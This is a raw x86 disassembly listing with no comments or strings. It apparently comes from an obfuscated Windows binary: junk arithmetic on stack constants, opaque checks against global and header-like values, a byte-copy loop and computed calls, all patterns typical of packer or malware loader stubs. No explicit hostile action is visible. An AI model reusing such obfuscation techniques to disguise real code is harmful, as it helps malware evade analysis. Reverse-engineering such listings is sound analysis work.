  41cae7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  41caee:	mov    ecx,DWORD PTR [ebp-0xc]
  41caf1:	mov    eax,0x4401
  41caf6:	sub    eax,ecx
  41caf8:	mov    ecx,DWORD PTR [ebp-0x4]
  41cafb:	xor    edx,edx
  41cafd:	div    ecx
  41caff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb02:	xor    eax,0xa80
  41cb07:	or     eax,0x343b
  41cb0c:	or     eax,ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  41cb18:	mov    DWORD PTR [ebp-0xc],0x327f
  41cb1f:	mov    DWORD PTR [ebp-0x14],0x5215
  41cb26:	mov    DWORD PTR [ebp+0x8],0x2502
  41cb2d:	mov    eax,DWORD PTR [ebp+0x8]
  41cb30:	add    eax,DWORD PTR [ebp-0x14]
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	and    eax,0x2bab
  41cb3b:	lea    eax,[eax+ecx*1-0x557f]
  41cb42:	mov    ecx,DWORD PTR [ebp+0xc]
  41cb45:	mov    DWORD PTR [esi+eax*4],ecx
  41cb48:	mov    DWORD PTR [ebp-0xc],edi
  41cb4b:	mov    DWORD PTR [ebp+0x8],0x5f40
  41cb52:	mov    DWORD PTR [ebp-0x14],0x6ba4
  41cb59:	mov    DWORD PTR [ebp+0xc],0x7b17
  41cb60:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb63:	mov    eax,0x43d2
  41cb68:	sub    eax,ecx
  41cb6a:	add    eax,DWORD PTR [ebp+0xc]
  41cb6d:	xor    edx,edx
  41cb6f:	add    eax,DWORD PTR [ebp-0x14]
  41cb72:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb75:	div    ecx
  41cb77:	mov    ecx,DWORD PTR [ebp+0x10]
  41cb7a:	xor    edx,edx
  41cb7c:	pop    edi
  41cb7d:	pop    ebx
  41cb7e:	or     eax,0x67ad
  41cb83:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  41cb8a:	mov    DWORD PTR [ebp+0x10],0x517b
  41cb91:	mov    DWORD PTR [ebp+0xc],0x5d62
  41cb98:	mov    DWORD PTR [ebp+0x8],0x41b0
  41cb9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cba2:	mov    eax,DWORD PTR [ebp+0xc]
  41cba5:	and    ecx,0x68c1
  41cbab:	sub    ecx,0x6fd3
  41cbb1:	or     ecx,eax
  41cbb3:	mov    eax,DWORD PTR [ebp+0x10]
  41cbb6:	imul   ecx,eax
  41cbb9:	mov    eax,0xf52840d5
  41cbbe:	div    ecx
  41cbc0:	leave  
  41cbc1:	ret    0xc
  41cbc4:	push   ebp
  41cbc5:	mov    ebp,esp
  41cbc7:	sub    esp,0xc0
  41cbcd:	push   esi
  41cbce:	mov    DWORD PTR [ebp-0x80],0x2f93
  41cbd5:	mov    DWORD PTR [ebp-0x7c],0x3321
  41cbdc:	mov    DWORD PTR [ebp-0x70],0x7d00
  41cbe3:	mov    DWORD PTR [ebp-0x6c],0xd87
  41cbea:	mov    DWORD PTR [ebp-0x60],0x4197
  41cbf1:	mov    DWORD PTR [ebp-0x5c],0xa7d
  41cbf8:	mov    DWORD PTR [ebp-0x50],0x772d
  41cbff:	mov    DWORD PTR [ebp-0x4c],0x37d8
  41cc06:	mov    DWORD PTR [ebp-0x40],0x414a
  41cc0d:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41cc14:	mov    DWORD PTR [ebp-0x30],0x136b
  41cc1b:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41cc22:	mov    DWORD PTR [ebp-0x20],0x32d8
  41cc29:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41cc30:	mov    DWORD PTR [ebp-0xc],0x3956
  41cc37:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41cc41:	mov    DWORD PTR [ebp-0x94],0x1
  41cc4b:	mov    DWORD PTR [ebp-0x14],0x17ab
  41cc52:	mov    DWORD PTR [ebp-0x64],0x7a3d
  41cc59:	mov    DWORD PTR [ebp-0x54],0x378a
  41cc60:	mov    DWORD PTR [ebp-0x74],0x5a00
  41cc67:	mov    DWORD PTR [ebp-0x24],0x1f3a
  41cc6e:	mov    DWORD PTR [ebp-0x84],0x9a225
  41cc78:	mov    DWORD PTR [ebp-0x44],0x31f8
  41cc7f:	mov    DWORD PTR [ebp-0x34],0x3663
  41cc86:	mov    DWORD PTR [ebp-0xb4],0x3165
  41cc90:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  41cc9a:	mov    DWORD PTR [ebp-0xbc],0x43cc
  41cca4:	mov    DWORD PTR [ebp-0xb0],0x7564
  41ccae:	mov    DWORD PTR [ebp-0xac],0x18cf
  41ccb8:	mov    DWORD PTR [ebp-0xa0],0x3135
  41ccc2:	mov    DWORD PTR [ebp-0x9c],0x568d
  41cccc:	mov    DWORD PTR [ebp-0x90],0x11f2
  41ccd6:	mov    DWORD PTR [ebp-0x8c],0x63ea
  41cce0:	mov    DWORD PTR [ebp-0x10],0x3066
  41cce7:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41ccee:	push   0x7e1d
  41ccf3:	mov    DWORD PTR [ebp-0x4],0x30f4
  41ccfa:	mov    eax,DWORD PTR [ebp-0x20]
  41ccfd:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cd00:	push   0x5380
  41cd05:	push   ecx
  41cd06:	push   eax
  41cd07:	call   0x41dfae
  41cd0c:	mov    ecx,eax
  41cd0e:	mov    eax,DWORD PTR [ebp-0x30]
  41cd11:	xor    ecx,eax
  41cd13:	mov    esi,edx
  41cd15:	mov    edx,DWORD PTR [ebp-0x2c]
  41cd18:	mov    eax,DWORD PTR [ebp-0x40]
  41cd1b:	xor    esi,edx
  41cd1d:	mov    edx,DWORD PTR [ebp-0x3c]
  41cd20:	xor    ecx,0xf3a
  41cd26:	or     ecx,eax
  41cd28:	mov    eax,ds:0x422268
  41cd2d:	mov    eax,DWORD PTR [eax+0x1d8]
  41cd33:	mov    eax,DWORD PTR [eax]
  41cd35:	xor    esi,0x6665
  41cd3b:	or     esi,edx
  41cd3d:	add    ecx,0xef6a96a5
  41cd43:	cdq    
  41cd44:	adc    esi,0xc8b6a000
  41cd4a:	cmp    eax,ecx
  41cd4c:	jne    0x41cd5a
  41cd52:	cmp    edx,esi
  41cd54:	je     0x41cdb9
  41cd5a:	mov    eax,DWORD PTR [ebp-0x50]
  41cd5d:	mov    ecx,DWORD PTR [ebp-0x4c]
  41cd60:	mov    edx,DWORD PTR [ebp-0x60]
  41cd63:	mov    esi,DWORD PTR [ebp-0x5c]
  41cd66:	add    eax,0x7818
  41cd6b:	adc    ecx,0x87
  41cd71:	or     eax,edx
  41cd73:	mov    edx,DWORD PTR [ebp-0x70]
  41cd76:	or     ecx,esi
  41cd78:	mov    esi,DWORD PTR [ebp-0x6c]
  41cd7b:	push   esi
  41cd7c:	push   edx
  41cd7d:	push   ecx
  41cd7e:	push   eax
  41cd7f:	call   0x41dfae
  41cd84:	mov    ecx,DWORD PTR [ebp-0x80]
  41cd87:	mov    esi,DWORD PTR [ebp-0x7c]
  41cd8a:	and    eax,ecx
  41cd8c:	mov    ecx,DWORD PTR ds:0x422268
  41cd92:	mov    ecx,DWORD PTR [ecx+0x1d0]
  41cd98:	mov    ecx,DWORD PTR [ecx]
  41cd9a:	and    edx,esi
  41cd9c:	xor    eax,0x2b01
  41cda1:	xor    edx,0x2021
  41cda7:	xor    esi,esi
  41cda9:	cmp    ecx,eax
  41cdab:	jne    0x41cef7
  41cdb1:	cmp    esi,edx
  41cdb3:	jne    0x41cef7
  41cdb9:	mov    eax,DWORD PTR [ebp-0xa4]
  41cdbf:	mov    ecx,DWORD PTR [ebp-0xc]
  41cdc2:	add    eax,0x80ca
  41cdc7:	or     eax,ecx
  41cdc9:	mov    ecx,DWORD PTR ds:0x422304
  41cdcf:	or     eax,0x686
  41cdd4:	xor    eax,0x3eec
  41cdd9:	lea    eax,[eax+ecx*1-0xc11b]
  41cde0:	xor    DWORD PTR ds:0x4222fc,eax
  41cde6:	mov    eax,DWORD PTR [ebp-0x64]
  41cde9:	and    eax,0x4dff
  41cdee:	add    eax,DWORD PTR [ebp-0x14]
  41cdf1:	mov    ecx,DWORD PTR [ebp-0x94]
  41cdf7:	xor    eax,0x676c
  41cdfc:	xor    edx,edx
  41cdfe:	div    ecx
  41ce00:	mov    ecx,DWORD PTR [ebp-0x24]
  41ce03:	mov    edx,DWORD PTR [ebp-0x74]
  41ce06:	xor    ecx,0x6e1e
  41ce0c:	imul   ecx,edx
  41ce0f:	mov    edx,DWORD PTR [ebp+0x8]
  41ce12:	push   0x4
  41ce14:	push   0xe4c37b20
  41ce19:	xor    eax,0x3884
  41ce1e:	mov    eax,DWORD PTR [eax+edx*1]
  41ce21:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  41ce28:	mov    eax,DWORD PTR [ebp-0x34]
  41ce2b:	mov    edx,DWORD PTR [ebp-0xb4]
  41ce31:	lea    eax,[edx+eax*1-0x76d2]
  41ce38:	mov    edx,DWORD PTR [ebp-0x44]
  41ce3b:	mov    esi,DWORD PTR [ebp-0x84]
  41ce41:	or     eax,edx
  41ce43:	xor    edx,edx
  41ce45:	div    esi
  41ce47:	mov    edx,DWORD PTR [ebp-0x54]
  41ce4a:	add    eax,0x43d7
  41ce4f:	xor    eax,0x5e6a
  41ce54:	add    eax,DWORD PTR [edx+ecx*1]
  41ce57:	mov    ecx,DWORD PTR ds:0x4222fc
  41ce5d:	add    DWORD PTR [eax],ecx
  41ce5f:	mov    eax,DWORD PTR [ebp-0x90]
  41ce65:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ce6b:	mov    edx,DWORD PTR [ebp-0xa0]
  41ce71:	mov    esi,DWORD PTR [ebp-0x9c]
  41ce77:	sub    edx,eax
  41ce79:	mov    eax,DWORD PTR [ebp-0xb0]
  41ce7f:	sbb    esi,ecx
  41ce81:	mov    ecx,DWORD PTR [ebp-0xac]
  41ce87:	xor    edx,eax
  41ce89:	mov    eax,DWORD PTR [ebp-0xc0]
  41ce8f:	xor    esi,ecx
  41ce91:	mov    ecx,DWORD PTR [ebp-0xbc]
  41ce97:	add    edx,eax
  41ce99:	adc    esi,ecx
  41ce9b:	add    edx,0x2313
  41cea1:	adc    esi,0x2a00
  41cea7:	push   esi
  41cea8:	push   edx
  41cea9:	call   0x421af3
  41ceae:	mov    ecx,0x1207
  41ceb3:	sub    ecx,eax
  41ceb5:	push   0x0
  41ceb7:	pop    eax
  41ceb8:	sbb    eax,edx
  41ceba:	mov    edx,DWORD PTR ds:0x4222fc
  41cec0:	xor    esi,esi
  41cec2:	cmp    edx,ecx
  41cec4:	jne    0x41cef7
  41ceca:	cmp    esi,eax
  41cecc:	jne    0x41cef7
  41ced2:	mov    eax,DWORD PTR [ebp-0x4]
  41ced5:	mov    ecx,DWORD PTR [ebp-0x8]
  41ced8:	add    eax,0x4296
  41cedd:	shr    eax,0x2
  41cee0:	or     eax,ecx
  41cee2:	mov    ecx,DWORD PTR [ebp-0x10]
  41cee5:	xor    eax,ecx
  41cee7:	xor    eax,0x4e94
  41ceec:	add    eax,DWORD PTR ds:0x4222fc
  41cef2:	mov    ds:0x422304,eax
  41cef7:	pop    esi
  41cef8:	leave  
  41cef9:	ret    0x4
  41cefc:	push   ebp
  41cefd:	mov    ebp,esp
  41ceff:	sub    esp,0x58
  41cf02:	push   ebx
  41cf03:	push   esi
  41cf04:	push   edi
  41cf05:	mov    DWORD PTR [ebp-0x58],0x3082
  41cf0c:	mov    DWORD PTR [ebp-0x54],0x37a2
  41cf13:	mov    DWORD PTR [ebp-0x50],0x49d6
  41cf1a:	mov    DWORD PTR [ebp-0x4c],0x6390
  41cf21:	mov    DWORD PTR [ebp-0x48],0x40f2
  41cf28:	mov    DWORD PTR [ebp-0x44],0x21d4
  41cf2f:	mov    DWORD PTR [ebp-0x28],0x4726
  41cf36:	mov    DWORD PTR [ebp-0x24],0x221a
  41cf3d:	mov    DWORD PTR [ebp-0x30],0x768c
  41cf44:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41cf4b:	mov    DWORD PTR [ebp-0x40],0x6cf6
  41cf52:	mov    DWORD PTR [ebp-0x3c],0x94c
  41cf59:	mov    DWORD PTR [ebp-0x38],0x4797
  41cf60:	mov    DWORD PTR [ebp-0x34],0x4439
  41cf67:	mov    DWORD PTR [ebp-0x20],0x2531
  41cf6e:	mov    esi,0x5a3e
  41cf73:	mov    DWORD PTR [ebp-0x1c],esi
  41cf76:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  41cf7d:	mov    DWORD PTR [ebp-0x14],0x7
  41cf84:	mov    DWORD PTR [ebp-0x10],0xe3a
  41cf8b:	mov    DWORD PTR [ebp-0xc],0x6a6e
  41cf92:	mov    DWORD PTR [ebp-0x8],0x6b99
  41cf99:	mov    DWORD PTR [ebp-0x4],0x2acd
  41cfa0:	mov    eax,DWORD PTR [ebp-0x10]
  41cfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41cfa6:	mov    eax,DWORD PTR [ebp-0x8]
  41cfa9:	mov    ecx,DWORD PTR [ebp-0x4]
  41cfac:	mov    eax,DWORD PTR [ebp-0x18]
  41cfaf:	mov    ecx,DWORD PTR [ebp-0x14]
  41cfb2:	mov    eax,DWORD PTR [ebp-0x8]
  41cfb5:	mov    ecx,DWORD PTR [ebp-0x4]
  41cfb8:	mov    edx,DWORD PTR [ebp-0x10]
  41cfbb:	mov    edi,DWORD PTR [ebp-0xc]
  41cfbe:	add    eax,edx
  41cfc0:	mov    edx,DWORD PTR [ebp-0x18]
  41cfc3:	adc    ecx,edi
  41cfc5:	mov    edi,DWORD PTR [ebp-0x14]
  41cfc8:	push   edi
  41cfc9:	push   edx
  41cfca:	or     ecx,0x6833
  41cfd0:	or     eax,0x6b80
  41cfd5:	push   ecx
  41cfd6:	push   eax
  41cfd7:	call   0x421af3
  41cfdc:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfdf:	mov    edi,DWORD PTR [ebp-0x1c]
  41cfe2:	and    eax,0x25cb
  41cfe7:	or     eax,ecx
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfec:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cfef:	and    edx,0x76f2
  41cff5:	or     edx,edi
  41cff7:	xor    edx,esi
  41cff9:	xor    eax,0x253b
  41cffe:	shld   edx,eax,0x2
  41d002:	shl    eax,0x2
  41d005:	shr    ecx,0x1e
  41d008:	xor    esi,esi
  41d00a:	or     eax,ecx
  41d00c:	or     edx,esi
  41d00e:	mov    edi,0xba699573
  41d013:	xor    eax,edi
  41d015:	mov    DWORD PTR [ebp-0x20],eax
  41d018:	mov    esi,0x9c0a89d8
  41d01d:	xor    edx,esi
  41d01f:	mov    DWORD PTR [ebp-0x1c],edx
  41d022:	mov    eax,DWORD PTR [ebp-0x38]
  41d025:	mov    ecx,DWORD PTR [ebp-0x34]
  41d028:	mov    edx,DWORD PTR [ebp-0x40]
  41d02b:	mov    ebx,DWORD PTR [ebp-0x3c]
  41d02e:	push   ebx
  41d02f:	push   edx
  41d030:	push   ecx
  41d031:	push   eax
  41d032:	call   0x41dfae
  41d037:	add    eax,0x536a
  41d03c:	adc    edx,0x9573
  41d042:	push   0x12613
  41d047:	push   0xae21daec
  41d04c:	push   edx
  41d04d:	push   eax
  41d04e:	call   0x421af3
  41d053:	mov    ecx,eax
  41d055:	mov    eax,DWORD PTR [ebp-0x20]
  41d058:	mov    ebx,DWORD PTR [ebp-0x1c]
  41d05b:	xor    ecx,0x1b8b
  41d061:	xor    edx,0x0
  41d064:	add    ecx,eax
  41d066:	mov    eax,DWORD PTR [ebp+0xc]
  41d069:	adc    edx,ebx
  41d06b:	mov    DWORD PTR [eax],ecx
  41d06d:	mov    DWORD PTR [eax+0x4],edx
  41d070:	mov    eax,DWORD PTR [ebp-0x30]
  41d073:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d076:	mov    edx,0xbdb2
  41d07b:	sub    edx,eax
  41d07d:	mov    eax,DWORD PTR [ebp-0x28]
  41d080:	mov    ebx,0x4c02
  41d085:	sbb    ebx,ecx
  41d087:	mov    ecx,DWORD PTR [ebp-0x24]
  41d08a:	sub    edx,eax
  41d08c:	mov    eax,DWORD PTR [ebp+0xc]
  41d08f:	sbb    ebx,ecx
  41d091:	add    edx,DWORD PTR [eax]
  41d093:	mov    ecx,DWORD PTR [ebp-0x28]
  41d096:	adc    ebx,DWORD PTR [eax+0x4]
  41d099:	push   0x2
  41d09b:	xor    ebx,esi
  41d09d:	mov    esi,DWORD PTR [ebp-0x24]
  41d0a0:	pop    esi
  41d0a1:	sub    esi,ecx
  41d0a3:	mov    ecx,DWORD PTR [ebp-0x30]
  41d0a6:	sub    esi,ecx
  41d0a8:	xor    edx,edi
  41d0aa:	mov    edi,DWORD PTR [ebp-0x2c]
  41d0ad:	mov    ecx,DWORD PTR [ebp+0xc]
  41d0b0:	add    esi,DWORD PTR [ecx]
  41d0b2:	mov    eax,ebx
  41d0b4:	shrd   edx,eax,0x2
  41d0b8:	xor    ecx,ecx
  41d0ba:	shl    esi,0x1e
  41d0bd:	shr    eax,0x2
  41d0c0:	or     ecx,edx
  41d0c2:	xor    esi,0xc0000000
  41d0c8:	or     esi,eax
  41d0ca:	mov    DWORD PTR [ebp-0x40],ecx
  41d0cd:	push   0x0
  41d0cf:	mov    DWORD PTR [ebp-0x3c],esi
  41d0d2:	mov    eax,DWORD PTR [ebp-0x48]
  41d0d5:	mov    ecx,DWORD PTR [ebp-0x44]
  41d0d8:	push   0xae0404d3
  41d0dd:	push   ecx
  41d0de:	push   eax
  41d0df:	call   0x421af3
  41d0e4:	mov    ecx,eax
  41d0e6:	mov    eax,DWORD PTR [ebp-0x50]
  41d0e9:	mov    esi,DWORD PTR [ebp-0x4c]
  41d0ec:	or     ecx,eax
  41d0ee:	mov    eax,DWORD PTR [ebp-0x40]
  41d0f1:	or     edx,esi
  41d0f3:	mov    esi,DWORD PTR [ebp-0x3c]
  41d0f6:	add    ecx,eax
  41d0f8:	mov    eax,DWORD PTR [ebp-0x58]
  41d0fb:	adc    edx,esi
  41d0fd:	mov    esi,DWORD PTR [ebp-0x54]
  41d100:	add    ecx,eax
  41d102:	mov    eax,DWORD PTR [ebp+0x8]
  41d105:	adc    edx,esi
  41d107:	add    ecx,0xffff55a8
  41d10d:	pop    edi
  41d10e:	adc    edx,0xffff64cd
  41d114:	pop    esi
  41d115:	mov    DWORD PTR [eax],ecx
  41d117:	mov    DWORD PTR [eax+0x4],edx
  41d11a:	pop    ebx
  41d11b:	leave  
  41d11c:	ret    0x8
  41d11f:	push   ebp
  41d120:	mov    ebp,esp
  41d122:	sub    esp,0x3c
  41d125:	mov    DWORD PTR [ebp-0x20],0x3510
  41d12c:	mov    DWORD PTR [ebp-0x1c],0x2104
  41d133:	mov    DWORD PTR [ebp-0x18],0x5d15
  41d13a:	mov    DWORD PTR [ebp-0x14],0x30cd
  41d141:	mov    DWORD PTR [ebp-0x10],0x1709
  41d148:	mov    DWORD PTR [ebp-0xc],0x260b
  41d14f:	mov    DWORD PTR [ebp-0x8],0x3204
  41d156:	mov    DWORD PTR [ebp-0x4],0x62ea
  41d15d:	mov    DWORD PTR [ebp-0x38],0x58e9
  41d164:	mov    DWORD PTR [ebp-0x34],0x7f89
  41d16b:	mov    DWORD PTR [ebp-0x30],0x7fda
  41d172:	mov    DWORD PTR [ebp-0x2c],0x2889
  41d179:	mov    DWORD PTR [ebp-0x28],0xf0f
  41d180:	mov    DWORD PTR [ebp-0x24],0x58e1
  41d187:	mov    DWORD PTR [ebp-0x3c],0x69c
  41d18e:	mov    eax,DWORD PTR [ebp-0x10]
  41d191:	mov    ecx,DWORD PTR [ebp-0x14]
  41d194:	and    al,0xb9
  41d196:	add    al,cl
  41d198:	mov    ecx,DWORD PTR [ebp-0x18]
  41d19b:	and    al,cl
  41d19d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d1a0:	sub    al,0x11
  41d1a2:	and    al,cl
  41d1a4:	mov    ecx,DWORD PTR [ebp-0x20]
  41d1a7:	mov    edx,DWORD PTR [ebp+0x8]
  41d1aa:	imul   ecx,ecx,0x6008
  41d1b0:	add    ecx,0x1759dd6e
  41d1b6:	add    al,0x4d
  41d1b8:	xor    ecx,0x2b4185ee
  41d1be:	cmp    BYTE PTR [ecx+edx*1],al
  41d1c1:	jne    0x41d25b
  41d1c7:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ca:	mov    eax,0xffffeff8
  41d1cf:	mov    edx,eax
  41d1d1:	sub    edx,ecx
  41d1d3:	add    edx,DWORD PTR [ebp-0x8]
  41d1d6:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1d9:	or     edx,ecx
  41d1db:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1de:	imul   edx,edx,0x85300
  41d1e4:	sub    eax,ecx
  41d1e6:	add    eax,DWORD PTR [ebp-0x8]
  41d1e9:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1ec:	or     eax,ecx
  41d1ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41d1f1:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  41d1f8:	add    eax,0x40e5
  41d1fd:	imul   eax,eax,0x214c
  41d203:	add    eax,ecx
  41d205:	mov    ecx,DWORD PTR [ebp+0x8]
  41d208:	add    ecx,eax
  41d20a:	mov    DWORD PTR [ebp+0x8],ecx
  41d20d:	mov    eax,DWORD PTR [ebp-0x24]
  41d210:	mov    ecx,DWORD PTR [ebp-0x28]
  41d213:	and    eax,ecx
  41d215:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d218:	and    eax,ecx
  41d21a:	mov    ecx,DWORD PTR [ebp-0x30]
  41d21d:	imul   eax,ecx
  41d220:	mov    ecx,DWORD PTR [ebp-0x34]
  41d223:	or     eax,ecx
  41d225:	mov    ecx,DWORD PTR [ebp-0x38]
  41d228:	imul   eax,ecx
  41d22b:	mov    ecx,DWORD PTR [ebp+0x8]
  41d22e:	sub    eax,0x777ea653
  41d233:	cmp    DWORD PTR [ecx+0x54],eax
  41d236:	je     0x41d244
  41d23c:	mov    eax,DWORD PTR [ebp+0x8]
  41d23f:	jmp    0x41d28b
  41d244:	mov    eax,DWORD PTR [ebp-0x3c]
  41d247:	sub    eax,0x5258
  41d24c:	xor    eax,0x49e9
  41d251:	add    eax,0x253
  41d256:	jmp    0x41d28b
  41d25b:	mov    DWORD PTR [ebp-0x3c],0x4177
  41d262:	mov    DWORD PTR [ebp+0x8],0x1405
  41d269:	mov    eax,DWORD PTR [ebp+0x8]
  41d26c:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d26f:	imul   eax,eax,0x58cc
  41d275:	add    eax,0x3f39
  41d27a:	and    eax,ecx
  41d27c:	add    eax,0x3b90
  41d281:	or     eax,0x4b1c
  41d286:	sub    eax,0x7fdd
  41d28b:	leave  
  41d28c:	ret    0x4
  41d28f:	push   ebp
  41d290:	mov    ebp,esp
  41d292:	and    esp,0xfffffff8
  41d295:	sub    esp,0x20
  41d298:	push   ebx
  41d299:	push   esi
  41d29a:	lea    eax,[esp+0x10]
  41d29e:	mov    DWORD PTR [esp+0xc],eax
  41d2a2:	mov    eax,DWORD PTR [esp+0xc]
  41d2a6:	mov    ecx,DWORD PTR [esp+0x10]
  41d2aa:	mov    edx,DWORD PTR [esp+0x14]
  41d2ae:	sub    DWORD PTR [eax],ecx
  41d2b0:	sbb    DWORD PTR [eax+0x4],edx
  41d2b3:	mov    eax,DWORD PTR [esp+0xc]
  41d2b7:	or     DWORD PTR [eax],0xba6d9573
  41d2bd:	or     DWORD PTR [eax+0x4],0x9c0a89d8
  41d2c4:	lea    eax,[esp+0x18]
  41d2c8:	push   eax
  41d2c9:	lea    eax,[esp+0x24]
  41d2cd:	push   eax
  41d2ce:	call   0x41cefc
  41d2d3:	mov    eax,DWORD PTR [esp+0x18]
  41d2d7:	mov    ecx,DWORD PTR [esp+0x1c]
  41d2db:	push   DWORD PTR [ebp+0x18]
  41d2de:	mov    ebx,DWORD PTR [ebp+0xc]
  41d2e1:	push   DWORD PTR [ebp+0x14]
  41d2e4:	mov    esi,DWORD PTR [ebp+0x8]
  41d2e7:	push   DWORD PTR [ebp+0x10]
  41d2ea:	push   DWORD PTR [esp+0x20]
  41d2ee:	push   DWORD PTR [esp+0x20]
  41d2f2:	push   DWORD PTR [esp+0x38]
  41d2f6:	push   DWORD PTR [esp+0x38]
  41d2fa:	call   0x401000
  41d2ff:	pop    esi
  41d300:	pop    ebx
  41d301:	mov    esp,ebp
  41d303:	pop    ebp
  41d304:	ret    0x14
  41d307:	push   ebp
  41d308:	mov    ebp,esp
  41d30a:	sub    esp,0x28
  41d30d:	push   ebx
  41d30e:	push   esi
  41d30f:	push   edi
  41d310:	mov    DWORD PTR [ebp-0x10],0x6b3
  41d317:	mov    DWORD PTR [ebp-0xc],0x816
  41d31e:	mov    DWORD PTR [ebp-0x8],0x248f
  41d325:	mov    DWORD PTR [ebp-0x20],0x4ef0
  41d32c:	mov    DWORD PTR [ebp-0x1c],0x647f
  41d333:	mov    DWORD PTR [ebp-0x4],0x2
  41d33a:	mov    DWORD PTR [ebp-0x18],0x21b3
  41d341:	mov    DWORD PTR [ebp-0x14],0x7c
  41d348:	mov    DWORD PTR [ebp-0x28],0x77e3
  41d34f:	mov    DWORD PTR [ebp-0x24],0x2866
  41d356:	mov    ecx,DWORD PTR [ebp-0x4]
  41d359:	xor    edx,edx
  41d35b:	mov    eax,0x723d
  41d360:	div    ecx
  41d362:	mov    esi,0xffff8748
  41d367:	mov    edi,0x7929
  41d36c:	mov    ecx,eax
  41d36e:	mov    eax,DWORD PTR [ebp-0x1c]
  41d371:	imul   ecx,eax
  41d374:	mov    eax,DWORD PTR [ebp-0x20]
  41d377:	imul   ecx,ecx,0x758c
  41d37d:	xor    ecx,0x3583
  41d383:	or     ecx,eax
  41d385:	mov    eax,DWORD PTR [ebp-0x8]
  41d388:	mov    edx,DWORD PTR [ebp-0xc]
  41d38b:	xor    eax,edx
  41d38d:	mov    edx,DWORD PTR [ebp-0x10]
  41d390:	and    eax,edx
  41d392:	sub    eax,0x2ff7
  41d397:	xor    eax,0x53d2
  41d39c:	xor    edx,edx
  41d39e:	add    ecx,0x5a905891
  41d3a4:	div    esi
  41d3a6:	mov    esi,0x564d
  41d3ab:	jmp    0x41d43c
  41d3b0:	mov    DWORD PTR [ebp-0x4],0x3574
  41d3b7:	mov    ebx,DWORD PTR [ebp+0xc]
  41d3ba:	mov    DWORD PTR [ebp-0x1c],0x4b01
  41d3c1:	mov    DWORD PTR [ebp-0x20],0x7c1
  41d3c8:	mov    eax,DWORD PTR [ebp-0x20]
  41d3cb:	mov    edx,DWORD PTR [ebp-0x1c]
  41d3ce:	or     eax,0x4cf5
  41d3d3:	xor    eax,edx
  41d3d5:	mov    edx,DWORD PTR [ebp-0x4]
  41d3d8:	sub    eax,edx
  41d3da:	xor    eax,0x2ec2
  41d3df:	mov    edx,ecx
  41d3e1:	sub    edx,eax
  41d3e3:	sub    edx,0x564a
  41d3e9:	mov    DWORD PTR [ebp-0x4],edx
  41d3ec:	mov    eax,DWORD PTR [ebp-0x4]
  41d3ef:	mov    edx,DWORD PTR [ebp-0x4]
  41d3f2:	mov    dl,BYTE PTR [edx+ebx*1]
  41d3f5:	mov    ebx,DWORD PTR [ebp+0x8]
  41d3f8:	mov    BYTE PTR [eax+ebx*1],dl
  41d3fb:	mov    eax,DWORD PTR [ebp-0x24]
  41d3fe:	mov    edx,DWORD PTR [ebp-0x28]
  41d401:	imul   eax,edx
  41d404:	imul   eax,eax,0x24ef285a
  41d40a:	sub    eax,0x1e23
  41d40f:	imul   eax,eax,0x1ef9
  41d415:	xor    eax,0xb5479168
  41d41a:	add    ecx,eax
  41d41c:	mov    eax,DWORD PTR [ebp-0x8]
  41d41f:	mov    edx,DWORD PTR [ebp-0xc]
  41d422:	xor    eax,edx
  41d424:	mov    edx,DWORD PTR [ebp-0x10]
  41d427:	and    eax,edx
  41d429:	sub    eax,0x2ff7
  41d42e:	xor    eax,0x53d2
  41d433:	xor    edx,edx
  41d435:	mov    ebx,0xffff8748
  41d43a:	div    ebx
  41d43c:	mov    edx,DWORD PTR [ebp+0x10]
  41d43f:	sub    edx,eax
  41d441:	mov    eax,DWORD PTR [ebp-0x14]
  41d444:	add    eax,0x38ab
  41d449:	xor    eax,edi
  41d44b:	add    eax,DWORD PTR [ebp-0x18]
  41d44e:	mov    ebx,ecx
  41d450:	xor    eax,esi
  41d452:	sub    ebx,eax
  41d454:	cmp    ebx,edx
  41d456:	jbe    0x41d3b0
  41d45c:	pop    edi
  41d45d:	pop    esi
  41d45e:	pop    ebx
  41d45f:	leave  
  41d460:	ret    0xc
  41d463:	push   ebp
  41d464:	mov    ebp,esp
  41d466:	sub    esp,0x7c
  41d469:	or     DWORD PTR ds:0x4229a6,ebx
  41d46f:	push   ebx
  41d470:	sub    ebx,edx
  41d472:	push   esi
  41d473:	push   edi
  41d474:	movzx  ebx,BYTE PTR ds:0x4228ae
  41d47b:	and    DWORD PTR ds:0x422986,ebx
  41d481:	mov    eax,DWORD PTR [ebp+0x8]
  41d484:	mov    ecx,DWORD PTR [ebp+0xc]
  41d487:	shrd   eax,ecx,0x2
  41d48b:	cmp    DWORD PTR ds:0x4229ce,0x0
  41d492:	mov    DWORD PTR ds:0x42298a,edx
  41d498:	mov    esi,0x951
  41d49d:	jmp    0x41d4f8
